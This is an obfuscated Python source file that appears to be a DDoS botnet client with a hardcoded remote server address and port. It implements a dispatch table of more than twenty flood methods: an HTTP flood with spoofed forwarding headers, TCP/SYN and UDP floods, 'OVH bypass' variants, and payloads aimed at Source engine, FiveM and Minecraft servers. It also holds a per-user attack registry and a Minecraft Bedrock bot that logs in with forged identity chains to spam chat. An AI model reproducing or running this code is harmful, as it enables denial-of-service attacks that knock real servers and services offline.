Ap='HANDSHAKING'
Ao='intervalo'
An='Standard_Custom'
Am='replace'
Al=b'\x00\x00'
Ak=isinstance
AP='register_sent'
AO='entity_id'
AN='split_id'
AM='order_index'
AL='msg_index'
AK='send_seq'
AJ=b'\x00'
AI=bytearray
AB='CONNECTING_1'
AA='mtu_idx'
A9='spawn_fallback'
A8='resource_pack_done'
A7='mensajes'
A6='yaw'
A5='chunk'
A4='text'
A3='move'
A2='nombre'
x='ack_queue'
w='register_cmd'
v='z'
u='y'
t='x'
s='mtu_size'
r='port'
q='host'
p='.'
o=b''
n=Exception
j='use_variant_a'
i='sent_frames'
h=str
f='req2_retry_t'
e='split_map'
d='spawned'
c='client_id'
Y=''
V='mtu_retry_t'
U='proto'
T='pos'
S='utf-8'
R=bytes
Q='sock'
P='phase'
O=print
L=False
J=None
H=int
G=range
F='is_closing'
E=True
D=len
import subprocess as AQ,random as B,os as g,time as C,threading as N,socket as A,sys,struct as M,zlib as y,json,base64 as k,math,string as AR,signal,hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization as AS,hashes
from cryptography.hazmat.backends import default_backend as Aq
AT='45.13.236.245'
AU=26110
AV=5
X={}
a=[]
AC=N.Lock()
I=L
Ar=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
As=b'\xff\xff\xff\xffTSource Engine Query\x00'
At=b'atom data ontop my own ass amp/triphent is my dick and balls'
Au=b'UUUU\x00\x00\x00\x01'
Ba=AJ*1024
Av=[1024,2048]
def AW():
	try:
		A=g.cpu_count()
		if A and A>0:return A*4
	except:pass
	return 8
def Aw(ip,port,secs,stop_event,threads=0):
	b=b'POST';S=b'.';P=stop_event;M=secs;K=port;I=b'\r\n';T=M;Q=0;c=N.Lock();U=K==443;d=[b'GET',b,b'HEAD'];e=[b'/',b'/index.html',b'/api/v1/data',b'/login',b'/dashboard',b'/profile',b'/settings',b'/products',b'/services',b'/about',b'/contact',b'/blog',b'/news',b'/events',b'/gallery',b'/assets/css/style.css',b'/assets/js/main.js',b'/images/logo.png',b'/favicon.ico',b'/robots.txt',b'/sitemap.xml'];f=[b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',b'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',b'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',b'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0',b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/120.0'];V=[]
	for l in G(300):
		W=B.choice(d);g=B.choice(e);i=B.choice(f);F=o;F+=W+b' '+g+b' HTTP/1.1\r\n';F+=b'Host: '+ip.encode()+I;F+=b'User-Agent: '+i+I;F+=b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n';F+=b'Accept-Language: en-US,en;q=0.5\r\n';F+=b'Accept-Encoding: gzip, deflate, br\r\n';F+=b'Connection: keep-alive\r\n'
		if B.random()<.3:F+=b'Referer: https://google.com/\r\n'
		if B.random()<.2:F+=b'X-Forwarded-For: '+h(B.randint(1,255)).encode()+S+h(B.randint(1,255)).encode()+S+h(B.randint(1,255)).encode()+S+h(B.randint(1,255)).encode()+I
		if W==b:X=b'key='+Y.join(B.choices('abcdefghijklmnopqrstuvwxyz',k=10)).encode();F+=b'Content-Type: application/x-www-form-urlencoded\r\n';F+=b'Content-Length: '+h(D(X)).encode()+I;F+=I+X
		else:F+=I
		V.append(F)
	def Z():
		try:
			B=A.socket(A.AF_INET,A.SOCK_STREAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);B.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1);B.setsockopt(A.SOL_SOCKET,A.SO_SNDBUF,65536);B.setsockopt(A.SOL_SOCKET,A.SO_RCVBUF,65536);B.settimeout(2);B.connect((ip,K))
			if U:
				try:import ssl;C=ssl.create_default_context();C.check_hostname=L;C.verify_mode=ssl.CERT_NONE;B=C.wrap_socket(B,server_hostname=ip)
				except:pass
			return B
		except:return
	def j(worker_id):
		nonlocal Q;E=0
		try:
			D=[];M=8
			for N in G(M):
				A=Z()
				if A:D.append(A)
			if not D:return
			F=0;I=C.time();O=3000
			while C.time()<T:
				if P.is_set():break
				J=C.time()-I
				if J>.3:
					R=H(O*J);K=R-F
					if K>0:
						for N in G(min(K,30)):
							if C.time()>=T or P.is_set():break
							S=B.choice(V)
							for A in D[:]:
								try:A.send(S);E+=1
								except:
									try:A.close()
									except:pass
									L=Z()
									if L:U=D.index(A);D[U]=L
									else:D.remove(A)
									if not D:return
									continue
					F=0;I=C.time()
				for A in D[:]:
					try:A.recv(4096)
					except:pass
				C.sleep(.0001)
			with c:Q+=E
			for A in D:
				try:A.close()
				except:pass
		except:pass
	R=AW();O(f"[🌐] HTTP Flood iniciado");O(f"[+] Target: {"https"if U else"http"}://{ip}:{K}");O(f"[+] Duration: {H(M)}s");O(f"[+] Workers: {R}");O(f"[+] Connections per worker: 8");O(f"[+] Total connections: {R*8}");a=[]
	for k in G(R):J=N.Thread(target=j,args=(k,),daemon=E);J.start();a.append(J);C.sleep(.001)
	C.sleep(M);P.set()
	for J in a:
		try:J.join(timeout=2)
		except:pass
	O(f"[✅] HTTP Flood finalizado - Requests: {Q}")
Ax=1400
def Ay(ip,port,secs,stop_event,num_threads=1):
	K=stop_event;L=secs;M=H(C.time()^g.getpid());E=[]
	for N in G(num_threads*10):
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D.settimeout(.1)
			try:D.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
			except:pass
			try:I=12;D.setsockopt(A.IPPROTO_TCP,I,1)
			except:pass
			E.append(D)
		except:pass
	if not E:
		try:D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(.1);E.append(D)
		except:pass
	O=ip,port
	while C.time()<L:
		if K.is_set():break
		for D in E[:]:
			try:
				D.connect(O);B.seed(M+H(C.time()*1000)%1000000);P=R([B.randint(0,255)for A in G(Ax)])
				for N in G(50):
					if C.time()>=L or K.is_set():break
					try:
						Q=D.send(P)
						if Q<=0:break
					except(A.error,BrokenPipeError):break
				try:D.close()
				except:pass
				F=A.socket(A.AF_INET,A.SOCK_STREAM);F.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);F.settimeout(.1)
				try:F.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
				except:pass
				try:I=12;F.setsockopt(A.IPPROTO_TCP,I,1)
				except:pass
				J=E.index(D);E[J]=F
			except(A.error,A.timeout,ConnectionRefusedError):
				try:D.close()
				except:pass
				try:
					F=A.socket(A.AF_INET,A.SOCK_STREAM);F.settimeout(.1)
					try:F.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
					except:pass
					J=E.index(D);E[J]=F
				except:pass
				continue
			except:continue
	for D in E:
		try:D.close()
		except:pass
def Az(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);B.connect((ip,port))
		while C.time()<secs:
			if stop_event.is_set():break
			for D in G(50):
				try:B.send(o)
				except:pass
		B.close()
	except:pass
def AX(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice(Av))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def A_(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,1024,2048]))
			for F in G(5):
				try:D.sendto(E,(ip,port))
				except:pass
	except:pass
def B0(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(65000)
			try:D.sendto(E[:B.randint(1000,65000)],(ip,port))
			except:pass
	except:pass
def B1(ip,port,secs,stop_event):
	try:
		E=[]
		for F in G(10):
			try:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E.append(D)
			except:pass
		while C.time()<secs:
			if stop_event.is_set():break
			for D in E:
				try:
					for F in G(50):H=B._urandom(1400);D.sendto(H,(ip,port))
				except:pass
		for D in E:
			try:D.close()
			except:pass
	except:pass
def B2(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,780,1024,1032]))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def B3(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def B4(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01'+AJ*23+Al
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def Bb(ip,port,secs,stop_event):
	E=stop_event
	while C.time()<secs:
		if E.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port));F=B._urandom(1024);G=C.time()
			while C.time()-G<2 and not E.is_set():
				try:D.send(F)
				except:break
			D.close()
		except:pass
def AY(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(3);D.connect((ip,port));E=B._urandom(65000)
			for F in G(10):
				try:D.send(E[:1400])
				except:break
			D.close()
		except:pass
def B5(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=B._urandom(65000)
		while C.time()<secs:
			if stop_event.is_set():break
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def B6(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[AJ,b'\x01',b'\xff',b'\x16',b'\x13',b'\x03',b'G',b'P',b'H',b'O',Al,b'\x01\x00',b'\xff\xff',b'\x80\x00',B._urandom(1),B._urandom(2)]
		while C.time()<secs:
			if stop_event.is_set():break
			for H in G(100):
				F=B.choice(E)
				try:D.sendto(F,(ip,port))
				except:pass
			C.sleep(.001)
		D.close()
	except:pass
def B7(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Au,(ip,port))
			except:pass
	except:pass
def B8(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[b'\xde\xad\xbe\xef\xc0\xff\xee\x00',b'\xba\xad\xf0\r\r\x15\xea^',b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',b'\xde\xad\xc0\xde\xf0\r\xba\xbe',b'\x00\x11"3DUfw',b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',b'\x01#Eg\x89\xab\xcd\xef',b'\xfe\xdc\xba\x98vT2\x10']
		while C.time()<secs:
			if stop_event.is_set():break
			F=B.choice(E)*B.randint(10,100)
			try:D.sendto(F,(ip,port))
			except:pass
	except:pass
def B9(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:B=A.socket(A.AF_INET,A.SOCK_STREAM);B.settimeout(1);B.connect((ip,port));B.send(g.urandom(1024));B.close()
		except:pass
def BA(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:
			if B.choice([E,L]):D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port));D.send(B._urandom(1024));D.close()
			else:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.sendto(B._urandom(1024),(ip,port))
		except:pass
def BB(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(At,(ip,port))
			except:pass
	except:pass
def BC(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Ar,(ip,port))
			except:pass
	except:pass
def BD(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(As,(ip,port))
			except:pass
	except:pass
def BE():
	try:A=AQ.check_output(['uname','-m'],stderr=AQ.DEVNULL);return A.decode().strip()
	except:return'unknown'
def Bc(length=4,chara='\n\r'):return Y.join(B.choice(chara)for A in G(length))
def AZ(method,ip,port,secs,stop_event,threads):
	D='.TCP';C=stop_event;A=method;B={'.HEX':B7,'.STDHEX':B8,'.UDP':AX,'.UDPFRAG':B0,'.UDPGAME':B2,'.UDPPPS':Az,'.UDPQUERY':B3,'.UDPBYPASS':AX,'.UDPBYPASSV2':A_,'.UDPKILL':B1,D:Ay,'.TCPOVH':AY,'.MIX':BA,'.SYN':B9,'.VSE':BD,'.MCPE':BB,'.FIVEM':BC,'.RAKNET':B4,'.OVHUDP':B5,'.OVHTCP':AY,'.OVHPPS':B6,'.HTTP':Aw}
	if A in B:
		if A==D:E=AW();B[A](ip,port,secs,C,E)
		else:B[A](ip,port,secs,C,0)
def BF(method,ip,port,duration,thread_count,username):
	H=thread_count;F=method;A=username;D=N.Event();I=C.time()+duration
	if F.upper()=='.HTTP':
		B=N.Thread(target=AZ,args=(F,ip,port,I,D,0),daemon=E);B.start()
		if A not in X:X[A]=[]
		X[A].append((B,D))
	else:
		for J in G(H):
			B=N.Thread(target=AZ,args=(F,ip,port,I,D,H),daemon=E);B.start()
			if A not in X:X[A]=[]
			X[A].append((B,D))
def BG(username):
	A=username
	if A in X:
		for(C,B)in X[A]:B.set()
		X[A].clear()
Aa=AR.ascii_lowercase+AR.digits
BH=R([0,255,255,0,254,254,254,254,253,253,253,253,18,52,86,120])
z=[1492,1464,1400,1200,576]
try:l=ec.generate_private_key(ec.SECP384R1(),Aq())
except n:l=J
def Ab():
	if l is J:return'AAAA'
	return k.b64encode(l.public_key().public_bytes(AS.Encoding.DER,AS.PublicFormat.SubjectPublicKeyInfo)).decode(S)
def Ac(data):
	A=data
	if Ak(A,(dict,list)):A=json.dumps(A,separators=(',',':')).encode(S)
	elif Ak(A,h):A=A.encode(S)
	return k.urlsafe_b64encode(A).rstrip(b'=').decode(S)
def BI(der):B=der;A=2;F=B[A+1];A+=2;C=B[A:A+F];A+=F;K=B[A+1];A+=2;E=B[A:A+K];G=AI(48);H=AI(48);I=C[1:]if C[0]==0 else C;J=E[1:]if E[0]==0 else E;G[48-D(I):]=I;H[48-D(J):]=J;return R(G)+R(H)
def Ad(payload):
	B=Ab();A=Ac({'alg':'ES384','x5u':B})+p+Ac(payload)
	if l is J:return A+p
	try:C=l.sign(A.encode(S),ec.ECDSA(hashes.SHA384()));return A+p+k.urlsafe_b64encode(BI(C)).rstrip(b'=').decode(S)
	except n:return A+p
class K:
	def __init__(A):A.parts=[]
	def u8(A,v):A.parts.append(M.pack('B',v&255));return A
	def u16be(A,v):A.parts.append(M.pack('>H',v&65535));return A
	def i32be(A,v):A.parts.append(M.pack('>i',v));return A
	def u32be(A,v):A.parts.append(M.pack('>I',v&4294967295));return A
	def i32le(A,v):A.parts.append(M.pack('<i',v));return A
	def i64be(A,v):A.parts.append(M.pack('>q',v));return A
	def u64be(A,v):A.parts.append(M.pack('>Q',v&0xffffffffffffffff));return A
	def f32be(A,v):A.parts.append(M.pack('>f',v));return A
	def t_le(A,v):A.parts.append(R([v&255,v>>8&255,v>>16&255]));return A
	def raw(A,b):A.parts.append(R(b));return A
	def magic(A):A.parts.append(BH);return A
	def str_(A,s):B=s.encode(S);A.u16be(D(B));A.parts.append(B);return A
	def str_raw(A,b):b=R(b);A.u16be(D(b));A.parts.append(b);return A
	def rak_ip(A,ip,port):
		A.u8(4)
		for B in ip.split(p):A.u8(~H(B)&255)
		A.u16be(port);return A
	def buf(A):return o.join(A.parts)
class b:
	def __init__(A,b):A.b=R(b);A.p=0
	def left(A):return D(A.b)-A.p
	def u8(A):B=A.b[A.p];A.p+=1;return B
	def u16be(A):B=M.unpack_from('>H',A.b,A.p)[0];A.p+=2;return B
	def i32be(A):B=M.unpack_from('>i',A.b,A.p)[0];A.p+=4;return B
	def u32be(A):B=M.unpack_from('>I',A.b,A.p)[0];A.p+=4;return B
	def i64be(A):B=M.unpack_from('>q',A.b,A.p)[0];A.p+=8;return B
	def u64be(A):B=M.unpack_from('>Q',A.b,A.p)[0];A.p+=8;return B
	def f32be(A):B=M.unpack_from('>f',A.b,A.p)[0];A.p+=4;return B
	def t_le(A):B=A.b[A.p]|A.b[A.p+1]<<8|A.b[A.p+2]<<16;A.p+=3;return B
	def bytes_(A,n):B=A.b[A.p:A.p+n];A.p+=n;return B
	def skip(A,n):A.p+=n;return A
	def str_(A):B=A.u16be();return A.bytes_(B).decode(S,errors=Am)
def BJ(base):return f"{base}_{Y.join(B.choices(Aa,k=6))}"
def BK():return Y.join(B.choices(Aa,k=8))
def BL():
	D=AI(8192)
	def A(x0,y0,x1,y1,r,g,b,a=255):
		for B in G(y0,y1):
			for C in G(x0,x1):A=(B*64+C)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=a
	def E(x,y,r,g,b):A=(y*64+x)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=255
	B=198,134,66;H=92,56,35;C=67,95,175;F=53,85,105;I=38,38,38;A(8,0,16,8,*H);A(16,0,24,8,*B);A(0,8,8,16,*B);A(8,8,16,16,*B);A(16,8,24,16,*H);A(24,8,32,16,*H);A(8,0,16,4,*H);A(9,9,11,11,255,255,255);E(9,10,33,18,7);A(13,9,15,11,255,255,255);E(14,10,33,18,7);E(11,11,*B);E(12,11,*B);E(11,12,140,80,30);E(12,12,140,80,30);A(10,13,14,14,140,60,20);A(20,16,28,20,*C);A(28,16,36,20,*C);A(16,20,20,32,*C);A(20,20,28,32,*C);A(28,20,32,32,*C);A(32,20,40,32,*C);A(23,20,25,32,50,75,155);A(44,16,48,20,*B);A(48,16,52,20,*B);A(40,20,44,32,*B);A(44,20,48,32,*B);A(48,20,52,32,*B);A(52,20,56,32,*B);A(44,20,48,24,*C);A(40,20,44,24,*C);A(48,20,52,24,*C);A(52,20,56,24,*C);A(4,16,8,20,*F);A(8,16,12,20,*F);A(0,20,4,32,*F);A(4,20,8,32,*F);A(8,20,12,32,*F);A(12,20,16,32,*F);A(0,28,4,32,*I);A(4,28,8,32,*I);A(8,28,12,32,*I);A(12,28,16,32,*I);return k.b64encode(R(D)).decode(S)
Ae=BL()
def BM(bot):A=bot;I=Ab();J='00000000-0000-4000-8000-'+g.urandom(6).hex();B=H(C.time());L=Ad({'extraData':{'displayName':A[A2],'identity':J,'XUID':Y},'identityPublicKey':I,'nbf':B-60,'exp':B+86400});M=Ad({'ClientRandomId':A[c]&4294967295,'ServerAddress':f"{A[q]}:{A[r]}",'SkinData':Ae,'SkinId':An,'CapeData':Y,'SkinGeometryName':'geometry.humanoid.custom','SkinGeometry':Y,'DeviceOS':1,'GameVersion':'0.15.10'});E=json.dumps({'chain':[L]}).encode(S);F=M.encode(S);N=K().i32le(D(E)).raw(E).i32le(D(F)).raw(F).buf();G=y.compress(N,level=7);return R([254,1])+K().i32be(84).i32be(D(G)).raw(G).buf()
def BN(bot):A=bot;B=k.b64decode(Ae);return K().u8(143).str_(A[A2]).i32be(70).i32be(70).u64be(A[c]).raw(g.urandom(16)).str_(f"{A[q]}:{A[r]}").str_(Y).str_(An).str_raw(B).u8(0).buf()
def BO(pkts,bot):
	B=o.join(M.pack('>I',D(A))+A for A in pkts);A=y.compress(B,level=7)
	if bot[U]>=84:return R([254,6])+K().i32be(D(A)).raw(A).buf()
	return K().u8(146).i32be(D(A)).raw(A).buf()
BP=1024
def Z(bot,buf):
	A=bot
	if A[Q]is J:return
	try:A[Q].sendto(buf,(A[q],A[r]))
	except:pass
def m(bot,payload,is_split,split_count,split_id,split_idx):
	E=is_split;C=payload;A=bot
	if A[Q]is J or A[F]or I:return
	G=A[AK];A[AK]+=1;B=K().u8(132).t_le(G);B.u8(112 if E else 96);B.u16be(D(C)*8);L=A[AL];A[AL]+=1;M=A[AM];A[AM]+=1;B.t_le(L).t_le(M).u8(0)
	if E:B.u32be(split_count).u16be(split_id).u32be(split_idx)
	B.raw(C);H=B.buf();A[i][G]=H
	if D(A[i])>BP:del A[i][next(iter(A[i]))]
	Z(A,H)
def Af(bot,payload):
	B=payload;A=bot
	if A[Q]is J or A[F]or I:return
	C=(A[s]or 1464)-60
	if D(B)<=C:m(A,B,L,0,0,0);return
	M=A[AN]&65535;A[AN]+=1;K=math.ceil(D(B)/C)
	for H in G(K):m(A,B[H*C:(H+1)*C],E,K,M,H)
def W(bot,pkt):
	A=bot
	if A[Q]is J or A[F]or I:return
	Af(A,BO([pkt],A))
def AD(bot):
	if bot[U]<84:return{A3:157,A4:147,A5:201}
	if bot[j]:return{A3:16,A4:7,A5:61}
	return{A3:19,A4:9,A5:69}
def A0(bot):return K().u8(AD(bot)[A5]).i32be(8).buf()
def BQ(bot):B=bot;A=B[T];return K().u8(AD(B)[A3]).i64be(B[AO]).f32be(A[t]).f32be(A[u]).f32be(A[v]).f32be(A[A6]).f32be(A[A6]).f32be(A['pitch']).u8(0).u8(1).buf()
def Ag(bot,msg):return K().u8(AD(bot)[A4]).u8(1).str_(bot[A2]).str_(msg).buf()
def Ah(bot,status):A=8 if bot[j]else 8;return K().u8(A).u8(status).u16be(0).buf()
def Ai(bot,status):
	A=bot
	if status==3 and not A[d]:A[d]=E;W(A,A0(A));BR(A);BT(A);BS(A)
def BR(bot):
	A=bot
	if A[AP]or not A[w]:return
	A[AP]=E
	if A[w].startswith('/'):B=f"{A[w]} {BK()}"
	else:B=A[w]
	W(A,Ag(A,B))
def BS(bot):
	A=bot
	def B():
		B=0
		while not A[F]and not I and A[d]:
			if A[A7]:E=A[A7][B%D(A[A7])];W(A,Ag(A,E));B+=1
			C.sleep(A[Ao])
	N.Thread(target=B,daemon=E).start()
def BT(bot):
	A=bot
	def D():
		D,E,G=A[T][t],A[T][u],A[T][v]
		while not A[F]and not I and A[d]:A[T][t]=D+B.uniform(-5,5);A[T][v]=G+B.uniform(-5,5);A[T][u]=E+B.uniform(-.5,.5);A[T][A6]=B.uniform(0,360);W(A,BQ(A));C.sleep(.5)
	N.Thread(target=D,daemon=E).start()
def A1(bot,data):
	G=data;A=bot
	if not G or A[F]:return
	C=G[0];B=b(G);B.skip(1)
	if C==144 or C==2:
		D=B.i32be()
		if D==0:W(A,A0(A))
		elif D in(1,2):AG(A)
		elif D==3:Ai(A,D)
		return
	if C==6 and A[U]>=84 and not A[A8]and not A[j]:W(A,Ah(A,3));return
	if C==7 and A[U]>=84 and not A[A8]and not A[j]:A[A8]=E;W(A,Ah(A,4));return
	if C==3 and A[U]>=84:W(A,K().u8(4).buf());W(A,A0(A));return
	if C in(149,9,11,17):
		if A[U]>=84:A[j]=C==9
		try:B.i32be();B.u8();B.i32be();B.i32be();A[AO]=B.i64be();B.i32be();B.i32be();B.i32be();A[T][t]=B.f32be();A[T][u]=B.f32be();A[T][v]=B.f32be()
		except:pass
		W(A,A0(A))
		if A[A9]is J:
			def L():
				if not A[d]and not A[F]and not I:Ai(A,3)
			H=N.Timer(1e1,L);H.daemon=E;H.start();A[A9]=H
		return
	if C in(145,5):AG(A);return
def AE(bot,payload):
	C=bot
	if C[F]:return
	try:
		E=b(payload);J=E.i32be();H=E.bytes_(min(J,E.left()))
		try:I=y.decompress(H)
		except:I=y.decompress(H,-15)
		A=b(I)
		while A.left()>=4:
			G=A.u32be()
			if G==0 or G>A.left():break
			B=A.bytes_(G)
			if B[0]==254 and D(B)>1:A1(C,B[1:])
			else:A1(C,B)
	except:pass
def Aj(bot,payload):
	B=bot;A=payload
	if not A or B[F]:return
	E=A[0]
	if E==0:
		if D(A)>=9:G=M.unpack_from('>q',A,1)[0];m(B,K().u8(3).i64be(G).i64be(H(C.time()*1000)).buf(),L,0,0,0)
		return
	if E==21:AG(B);return
	if E==16:BV(B,A);return
	if E==254:
		if D(A)<2:return
		if A[1]==6:AE(B,A[2:])
		else:A1(B,A[1:])
		return
	if E==146:AE(B,A[1:]);return
	if E==6 and B[U]>=84:AE(B,A[1:]);return
	A1(B,A)
def BU(bot,msg):
	B=bot
	if B[F]:return
	A=b(msg);A.skip(1);L=A.t_le();B[x].append(L)
	while A.left()>0:
		try:
			D=A.u8();E=D>>5&7;G=D>>4&1;M=A.u16be();N=math.ceil(M/8)
			if E in(2,3,4,6,7):A.t_le()
			if E in(1,3,4):A.t_le();A.u8()
			H=C=I=0
			if G:H=A.u32be();C=A.u16be();I=A.u32be()
			K=A.bytes_(N)
			if G:
				if C not in B[e]:B[e][C]=[J]*H
				B[e][C][I]=K
				if all(A is not J for A in B[e][C]):Aj(B,o.join(B[e][C]));del B[e][C]
			else:Aj(B,K)
		except:break
def BV(bot,payload):
	A=bot
	if A[F]:return
	B=b(payload);B.skip(1);E=0
	try:
		J=B.u8();B.skip(6 if J==4 else 18);B.skip(2)
		for M in G(10):O=B.u8();B.skip(6 if O==4 else 18)
		E=B.i64be()
	except:pass
	D=K().u8(19).rak_ip(A[q],A[r])
	for M in G(10):D.u8(4).u8(128).u8(255).u8(255).u8(254).u16be(0)
	D.i64be(E).i64be(H(C.time()*1000));m(A,D.buf(),L,0,0,0)
	if A[P]==Ap:
		A[P]='LOGIN'
		def Q():
			if I or A[F]:return
			Af(A,BM(A)if A[U]>=84 else BN(A))
		N.Timer(.1,Q).start()
def AF(bot):
	A=bot
	if A[Q]is J or A[F]or I:return
	B=z[A[AA]%D(z)];A[s]=B;C=max(0,B-28-1-16-1);Z(A,K().u8(5).magic().u8(7).raw(R(C)).buf())
def AG(bot):
	A=bot
	if A[F]:return
	A[F]=E;A[d]=L
	for B in(A9,V,f):
		C=A.get(B)
		if C:C.cancel();A[B]=J
	D=A[Q];A[Q]=J
	if D:
		try:D.close()
		except:pass
def AH(bot):
	A=bot
	if A[V]:A[V].cancel()
	def C():
		if A[P]!=AB or A[F]or I:return
		A[AA]=(A[AA]+1)%D(z);AF(A);AH(A)
	B=N.Timer(3.,C);B.daemon=E;B.start();A[V]=B
def BW(host,port,nombre,register_cmd,mensajes,intervalo):
	h='UNCONNECTED';B={q:host,r:port,A2:BJ(nombre),w:register_cmd,A7:mensajes,Ao:intervalo,c:H.from_bytes(g.urandom(8),'big'),s:z[0],AK:0,AL:0,AM:0,AN:0,AO:0,T:{t:0,u:64,v:0,A6:0,'pitch':0},d:L,F:L,Q:J,AP:L,P:h,AA:0,U:70,j:L,A8:L,x:[],e:{},i:{},A9:J,V:J,f:J};a=A.socket(A.AF_INET,A.SOCK_DGRAM);a.setblocking(L);a.bind((Y,0));B[Q]=a;Z(B,K().u8(1).i64be(H(C.time()*1000)).magic().u64be(B[c]).buf())
	def R():
		n='_req2flip';l='CONNECTING_2'
		while not B[F]and not I:
			try:A,u=a.recvfrom(65535)
			except BlockingIOError:C.sleep(.001);continue
			except:break
			if not A:continue
			W=A[0]
			if W==192:continue
			if W==160:
				try:
					Y=b(A);Y.skip(1);v=Y.u16be()
					for u in G(v):
						w=Y.u8();O=Y.t_le();T=O if w else Y.t_le()
						for y in G(O,T+1):
							o=B[i].get(y)
							if o and B[Q]and not B[F]:Z(B,o)
				except:pass
				continue
			if 128<=W<=143:
				BU(B,A)
				if B[x]and not B[F]:
					X=sorted(set(B[x]));d=[];R=0
					while R<D(X):
						O=T=X[R]
